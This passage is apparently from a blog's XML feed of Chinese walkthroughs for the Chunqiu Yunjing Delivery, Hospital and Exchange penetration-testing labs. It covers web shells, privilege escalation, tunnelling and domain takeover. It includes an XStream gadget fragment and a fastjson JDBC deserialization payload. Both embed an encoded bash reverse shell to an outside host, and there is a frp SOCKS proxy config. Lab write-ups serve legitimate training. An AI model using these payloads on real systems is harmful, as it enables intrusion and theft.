class="name">string</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">string</span>&gt;</span>60.204.245.37<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">int</span>&gt;</span>1099<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">long</span>&gt;</span>0<span class="tag">&lt;/<span class="name">long</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">int</span>&gt;</span>0<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">long</span>&gt;</span>0<span class="tag">&lt;/<span class="name">long</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">short</span>&gt;</span>0<span class="tag">&lt;/<span class="name">short</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">boolean</span>&gt;</span>false<span class="tag">&lt;/<span class="name">boolean</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;/<span class="name">java.rmi.server.RemoteObject</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">registry</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">host</span>&gt;</span>60.204.245.37<span class="tag">&lt;/<span class="name">host</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">port</span>&gt;</span>1099<span class="tag">&lt;/<span class="name">port</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">ctx</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">candidates</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">aliases</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">nullIter</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">sm</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure><figure><imgsrc="/images/春秋云境-Delivery/1753344362199-75e0f39b-570c-4dc2-831a-748805b7a882.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Delivery/1753344473130-8835a8ae-b71d-497c-b696-703c0041fc67.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>传fscan扫内网，除本机外还有三台机器</p><figure><imgsrc="/images/春秋云境-Delivery/1753344609390-acb2041d-8feb-41ed-9a44-20c4190122c9.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>搭建frp</p><figure><imgsrc="/images/春秋云境-Delivery/1753344772020-29c7faa1-1ac2-4980-b4b8-5ca51e8019e2.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Delivery/1753344783238-59f15974-c1fb-4e65-8397-95106e17903e.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>看到有个mysql弱口令，navicat连上去看下。</p><p>查询一下日志，发现是phpstudy搭的</p><figure><imgsrc="/images/春秋云境-Delivery/1753346421082-333b598f-ff97-402f-863f-cd16ba9cb77e.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>写个马进去</p><figure><imgsrc="/images/春秋云境-Delivery/1753346427442-376e3b8d-5eb1-4779-bd71-8a29541adde8.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>用蚁剑连接上拿flag</p><figure><imgsrc="/images/春秋云境-Delivery/1753346433270-ee939171-bc5f-4d11-b2a2-f80e38234dbb.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>再看centos的机器，根据提示是NFS提权</p><p>现在flag1所在机器上写个ssh公钥进去</p><figure><imgsrc="/images/春秋云境-Delivery/1753425539534-66f89002-03e9-4609-aa56-bd6217c5edda.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>然后</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install nfs-common</span><br></pre></td></tr></table></figure><p>查看可用nfs exports</p><figure><imgsrc="/images/春秋云境-Delivery/1753425631395-e8bfab0b-fe94-4622-ba9e-f2d2e7d1745a.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>挂载</p><figure><imgsrc="/images/春秋云境-Delivery/1753425798929-eac6a92c-9c7d-40f5-b579-bf911bcde55a.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>写入ssh公钥</p><figure><imgsrc="/images/春秋云境-Delivery/1753425996178-934334fc-68ae-44c9-bb8a-28ed7db437ec.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>ssh连上去</p><figure><imgsrc="/images/春秋云境-Delivery/1753426273188-36cf9f2e-8faa-42e4-af90-0ec15deea2a5.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>仍然需要提权才能读flag，但是可以看下hint给了个账号密码，这个是打flag3所在机器用的，但是我们已经打下来了（</p><figure><imgsrc="/images/春秋云境-Delivery/1753426334745-f65463e1-d363-48a0-b755-4aae75dd6893.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>尝试suid提权的时候发现开了ftp</p><figure><imgsrc="/images/春秋云境-Delivery/1753426594282-1e3836ff-9eba-4d68-940c-04463bab4e89.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>回到第一台机器用python开一下ftp服务</p><figure><imgsrc="/images/春秋云境-Delivery/1753426677983-0afd05d6-20cc-4935-b68a-5b70617a22bb.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>在centos机器上把flag2传过去</p><figure><imgsrc="/images/春秋云境-Delivery/1753426793000-afb80342-02e5-454f-9060-767877298efb.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Delivery/1753426831304-f645b9eb-4db1-4543-889a-a8b715a02984.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>接下来对最后一台机器进行攻击</p><p>前面已经用蚁剑连接上了flag3所在机器，先写个管理员用户进去</p><figure><imgsrc="/images/春秋云境-Delivery/1753429517762-e90d1a48-fe76-4e6b-b3cd-0cda83dada79.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>rdp连接，上传mimikatz抓取哈希</p><figure><imgsrc="/images/春秋云境-Delivery/1753429523630-e4e82de7-8786-44cc-b952-1a4df653b39d.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>bloodhound收集一下域内信息</p><figure><imgsrc="/images/春秋云境-Delivery/1753429530034-bfd25824-6c2b-443f-8c8e-3a528e329e17.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>可以看到chenglei这个用户具有wtiredacl权限</p><figure><imgsrc="/images/春秋云境-Delivery/1753429536212-4bc713a3-c5cf-4740-b6f8-431647f0eb9f.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>打RBCD</p><p>创建一个机器账户TEST$</p><figure><imgsrc="/images/春秋云境-Delivery/1753429542860-37f49e1c-266c-4126-8f41-05cfe1953ff7.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>配置属性指向域控机器的账户</p><figure><imgsrc="/images/春秋云境-Delivery/1753429548570-795f8892-b59e-4a7a-9b2f-cc335a267dfb.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>获取CIFS服务的ST</p><figure><imgsrc="/images/春秋云境-Delivery/1753429554525-4cfb437b-8b9a-46b8-b6e5-9041fd7a29a1.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>连上域控拿flag</p><figure><imgsrc="/images/春秋云境-Delivery/1753429560908-cb3bea6a-5a44-4d26-9630-4279e108fc22.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
          <category> 春秋云境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> 渗透 </tag>
            
            <tag> 春秋云境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春秋云境-Hospital</title>
      <link href="/posts/494627a/"/>
      <url>/posts/494627a/</url>
      
        <content type="html"><![CDATA[<p>先上fscan扫一遍，发现有heapdump泄露</p><figure><imgsrc="/images/春秋云境-Hospital/1753191352788-a364d2e2-7ccb-46f1-bc64-f89e6c3339fc.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>访问/actuator/heapdump下载</p><p>用工具分析，得到shirokey</p><figure><imgsrc="/images/春秋云境-Hospital/1753191675654-59219e78-d396-440a-b505-39439ad1c8a5.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>直接弹shell</p><figure><imgsrc="/images/春秋云境-Hospital/1753193436806-e3f135be-a1dc-4e52-b30b-8b0c6827afc0.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Hospital/1753193453717-10c5125a-ea95-4c4f-84eb-e67e01904660.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>这里是suid提权，查找这个vim.basic</p><figure><imgsrc="/images/春秋云境-Hospital/1753193716105-668a1b17-d2ca-4936-88de-e22ee38f51f6.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>根据gtfobins上查到的进行利用</p><figure><imgsrc="/images/春秋云境-Hospital/1753194946680-6a1f269e-e35d-44cb-9794-1bb790e18c8b.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Hospital/1753195027194-46d845c9-9162-4aef-9eb8-150143607e36.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>再写个ssh公钥进去，方便后面的操作</p><figure><imgsrc="/images/春秋云境-Hospital/1753196235325-a8d2bff8-d27a-41b8-b3ee-4ed92882e2b2.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>传fscan扫内网，除本机外还有两台机器</p><figure><imgsrc="/images/春秋云境-Hospital/1753195169689-c6fc7673-43f1-4cb4-a114-6c7c22ae962f.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>搭建frp</p><figure><imgsrc="/images/春秋云境-Hospital/1753195454547-30ff1e9c-e083-4518-9a97-3e8da65ac294.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Hospital/1753195467871-e0c0380b-a700-42b0-8cca-94ddd3003f1b.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>可以看到有台机器上面有nacos存在漏洞，这里打snakeyaml</p><p>修改AwesomeScriptEngineFactory.java，改为添加一个管理员用户</p><figure><imgsrc="/images/春秋云境-Hospital/1753196946272-d78ccea2-25e6-4a2d-ae45-e3017e2b6f00.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>点击生成jar.bat生成恶意jar包</p><figure><imgsrc="/images/春秋云境-Hospital/1753197018739-5a01d268-3104-4796-b26e-aaea1f376539.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>将payload上传到刚刚打下来的机器中</p><figure><imgsrc="/images/春秋云境-Hospital/1753197280768-4c7c63b6-4deb-4bef-9264-2f8f88571356.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>在/tmp下开启web服务</p><figure><imgsrc="/images/春秋云境-Hospital/1753197397049-ddbcf853-3f12-4ca1-a95f-fa0d8db65afe.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>先访问这台服务器</p><figure><imgsrc="/images/春秋云境-Hospital/1753201017057-53b3a3d7-e4e1-4ef0-9927-d18d4a6440e4.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>nacos/nacos弱口令登录，得到dataid和group</p><figure><imgsrc="/images/春秋云境-Hospital/1753201034194-52f1a044-4c26-474e-bb0d-2dfa8d5c1741.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>用gui加载恶意jar包</p><figure><imgsrc="/images/春秋云境-Hospital/1753203343543-37e39d8c-62d7-4f93-b2e2-1bad41cf2d79.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>rdp连接上，得到flag</p><figure><imgsrc="/images/春秋云境-Hospital/1753203352429-9bab3129-0880-460d-80f9-19595ff63d68.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>接下来打另一台机器</p><p>给bp配一下代理</p><figure><imgsrc="/images/春秋云境-Hospital/1753204216965-74da9fd6-0176-4218-97d7-3e67f57fc4fb.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>用bp的浏览器访问一下，是一个后台</p><figure><imgsrc="/images/春秋云境-Hospital/1753204291882-49bf438c-60cd-46b4-b6e2-16276e94babb.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>随便输点什么，抓个包</p><figure><imgsrc="/images/春秋云境-Hospital/1753204304586-c064486d-c67d-4fc2-bff4-1bd855c71121.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>用fastjson-exp插件打fastjsonecho拿到flag3</p><figure><imgsrc="/images/春秋云境-Hospital/1753204515365-44e4a909-8eb7-43bb-b9ac-aed0e5fdee3d.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Hospital/1753204532925-136c1735-598b-45a7-85db-558af00c99ad.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Hospital/1753204557844-3b5570b5-1549-4109-84d8-9feb80f69e8a.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>写个ssh公钥进去，方便后续操作</p><figure><imgsrc="/images/春秋云境-Hospital/1753204645015-21dfac9a-6b3b-4bbf-8ebb-8e331d9999b7.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>可以看到这台机器是多网卡</p><figure><imgsrc="/images/春秋云境-Hospital/1753204726766-b4e5901f-0a01-476c-b454-8458c153c26a.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>传个fscan上去扫下另一张网卡所在的网段</p><figure><imgsrc="/images/春秋云境-Hospital/1753205165149-dd6c26bd-0fad-472c-a88d-d122c4a53752.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>继续搭frp，配置代理链</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 172.30.12.5</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[socks_proxy]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port =6000</span><br><span class="line">plugin = socks5</span><br><span class="line">[common]</span><br><span class="line">bindPort = 7000</span><br></pre></td></tr></table></figure><figure><imgsrc="/images/春秋云境-Hospital/1753263306026-372c10a3-ed04-41a7-baa3-eb059ab00b10.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Hospital/1753263312455-87650cff-22c8-4bf1-aea4-d450ccb3f238.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Hospital/1753263323574-77d2458b-4eac-489b-aa4d-476f238b3600.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>访问过去是个grafana</p><figure><imgsrc="/images/春秋云境-Hospital/1753263330548-9e54a67f-fed2-4628-b4bf-c3ee6dea3f6f.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>是CVE-2021-43798，用现成exp打。但是不知道为什么我这里显示的是乱码，好像是exp版本的原因，但是找不到以前的版本了（查了下正确的密码应该是Postgres@123</p><figure><imgsrc="/images/春秋云境-Hospital/1753263391999-d90284a0-a6b2-48c7-9954-bb467a5b4e03.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>用navicat连接上去</p><figure><imgsrc="/images/春秋云境-Hospital/1753263409466-c9df4f50-9106-48a3-8735-1e8ef7e504e2.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>修改一下root密码，创建函数并用perl弹shell</p><figure><imgsrc="/images/春秋云境-Hospital/1753263451517-533f1269-e470-4d62-952f-ebfdaed7e1a8.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Hospital/1753263457259-59375568-4b91-409d-9e43-469519de062d.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>这里可以利用psql进行sudo提权</p><figure><imgsrc="/images/春秋云境-Hospital/1753263464769-9d541d63-728b-4d5c-8f34-9306e80bed60.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Hospital/1753263529557-6dfd89ad-8b2d-4545-b8c8-5df4cc1a1fef.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>起个tty，然后读flag</p><figure><imgsrc="/images/春秋云境-Hospital/1753263541189-f25a45d3-e271-40af-8d11-e10903d79f29.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Hospital/1753263557535-d3175b6d-4b05-4831-a23a-0b19e9881acc.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
          <category> 春秋云境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> 渗透 </tag>
            
            <tag> 春秋云境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春秋云境-Exchange</title>
      <link href="/posts/952d1a58/"/>
      <url>/posts/952d1a58/</url>
      
        <content type="html"><![CDATA[<p>先上fscan扫一遍</p><figure><imgsrc="/images/春秋云境-Exchange/1753101460341-f924a9b7-7e79-4a14-9cd6-1902219ba569.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>8000端口是后台，admin/123456弱口令登录</p><figure><imgsrc="/images/春秋云境-Exchange/1753101503936-148a23af-6089-488e-8a40-9101f66f2d64.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>右上角官方插件点出来是华夏erp，这里可以打jdbc反序列化</p><p>起一个恶意mysql，config.json配置如下，ysoserial-all.jar放在同一路径下</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;config&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;ysoserialPath&quot;</span><span class="punctuation">:</span><span class="string">&quot;ysoserial-all.jar&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;javaBinPath&quot;</span><span class="punctuation">:</span><span class="string">&quot;java&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;fileOutputDir&quot;</span><span class="punctuation">:</span><span class="string">&quot;./fileOutput/&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;displayFileContentOnScreen&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;saveToFile&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;fileread&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;win_ini&quot;</span><span class="punctuation">:</span><span class="string">&quot;c:\\windows\\win.ini&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;win_hosts&quot;</span><span class="punctuation">:</span><span class="string">&quot;c:\\windows\\system32\\drivers\\etc\\hosts&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;win&quot;</span><span class="punctuation">:</span><span class="string">&quot;c:\\windows\\&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;linux_passwd&quot;</span><span class="punctuation">:</span><span class="string">&quot;/etc/passwd&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;linux_hosts&quot;</span><span class="punctuation">:</span><span class="string">&quot;/etc/hosts&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;index_php&quot;</span><span class="punctuation">:</span><span class="string">&quot;index.php&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ssrf&quot;</span><span class="punctuation">:</span><span class="string">&quot;https://www.baidu.com/&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;__defaultFiles&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;/etc/hosts&quot;</span><span class="punctuation">,</span><span class="string">&quot;c:\\windows\\system32\\drivers\\etc\\hosts&quot;</span><span class="punctuation">]</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;yso&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Jdk7u21&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;Jdk7u21&quot;</span><span class="punctuation">,</span><span class="string">&quot;calc&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;CommonsCollections6&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;CommonCollections6&quot;</span><span class="punctuation">,</span><span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC82MC4yMDQuMjQ1LjM3LzIzMzMzIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><span class="punctuation">]</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><figure><imgsrc="/images/春秋云境-Exchange/1753103135239-94d5eaf3-b050-40e5-96ee-95dc5e556cc0.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>对exp进行url编码以后传过去即可getshell</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span> <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.mysql.jdbc.JDBC4Connection&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;hostToConnectTo&quot;</span><span class="punctuation">:</span> <span class="string">&quot;60.204.245.37&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;portToConnectTo&quot;</span><span class="punctuation">:</span> <span class="number">3306</span><span class="punctuation">,</span> <span class="attr">&quot;info&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> <span class="attr">&quot;user&quot;</span><span class="punctuation">:</span> <span class="string">&quot;yso_CommonsCollections6_bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC82MC4yMDQuMjQ1LjM3LzIzMzMzIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;pass&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;statementInterceptors&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoDeserialize&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;NUM_HOSTS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1&quot;</span> <span class="punctuation">&#125;</span> <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><figure><imgsrc="/images/春秋云境-Exchange/1753104993351-b6dd2ffc-3946-421f-883e-a072e833e739.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>拿到第一个flag</p><figure><imgsrc="/images/春秋云境-Exchange/1753105059348-01d41f9d-8195-43c7-9b34-c39014b05c10.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>扫内网，还有三台主机</p><figure><imgsrc="/images/春秋云境-Exchange/1753105557479-a5305876-f511-4a48-bf01-ba3eec5aa5a5.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>搭frp</p><figure><imgsrc="/images/春秋云境-Exchange/1753105665673-5c86a00f-cb96-49f4-9d4a-7f450bdf7965.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Exchange/1753105688863-a72122e0-8ddf-4483-8f10-bb1f8d01ec2b.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>有个outlook，访问一下</p><figure><imgsrc="/images/春秋云境-Exchange/1753106337188-4170113a-70eb-4c04-a54d-8c7fd5095c4c.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>直接用exp打，写入后门</p><figure><imgsrc="/images/春秋云境-Exchange/1753106448308-86bc0b33-9b16-46d6-b3b1-22b019d58cea.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>用它给出的方式写入管理员用户</p><figure><imgsrc="/images/春秋云境-Exchange/1753106558509-0fac20ab-143f-41c3-b362-bd2b8a3925e3.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Exchange/1753106600579-1a76d76d-840a-48c1-8413-4c076b62ce73.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>rdp连接，拿到第二个flag</p><figure><imgsrc="/images/春秋云境-Exchange/1753107091001-dd237838-f285-45d4-bc4c-cb4e7743fecc.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>上传mimikatz抓取域内用户哈希</p><figure><imgsrc="/images/春秋云境-Exchange/1753107099345-056dc3c4-ba5a-47a3-be29-ab0eee50bd94.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>bloodhound收集信息</p><figure><imgsrc="/images/春秋云境-Exchange/1753107516315-380b345b-bfa2-4d72-a287-9fcfae2eed2e.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Exchange/1753107690545-a9a05678-0317-4f1d-9b00-ee64f22145dc.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>用户zhangtong具有WriteDacl权限，因此可以写DCSync</p><figure><imgsrc="/images/春秋云境-Exchange/1753108081004-62c30205-460e-4ffa-af23-57e582e5478b.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>dump域内用户哈希</p><figure><imgsrc="/images/春秋云境-Exchange/1753108235966-01f7522a-9dfb-4979-8c74-b3ddd17bcd8c.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>对域控打pth</p><figure><imgsrc="/images/春秋云境-Exchange/1753108396431-93fdbe1e-0e1f-41e2-9f70-85c8914ef0b9.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>还有一台机器，flag不在常规路径。注意到前面dump哈希时有个Lumia用户，发现其桌面有东西</p><figure><imgsrc="/images/春秋云境-Exchange/1753108615806-2cee5fca-9902-4131-bce2-1623d6bea9e2.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>下载下来</p><figure><imgsrc="/images/春秋云境-Exchange/1753108721919-3bc2e5b3-9504-4bad-98ba-4b0040169415.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>压缩包竟然需要密码。。。</p><p>创建管理员用户</p><figure><imgsrc="/images/春秋云境-Exchange/1753110893064-f3481c08-46bc-48dc-aae5-d49cf7f3056f.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>rdp连上域控修改Lumia的密码</p><figure><imgsrc="/images/春秋云境-Exchange/1753110904858-954704e4-3666-4e68-8207-6bfdec6e967e.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>用修改的Lumia的密码登陆上其outlook账户，可以看到hint，密码是手机号</p><figure><imgsrc="/images/春秋云境-Exchange/1753110972766-e31fd627-7dd7-4d28-a1d6-e8f209561a33.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>另外还给了个手机号列表</p><figure><imgsrc="/images/春秋云境-Exchange/1753110964098-d207d43f-d75d-4f0b-bac6-1d5fc81918e9.png"alt="img" /><figcaption 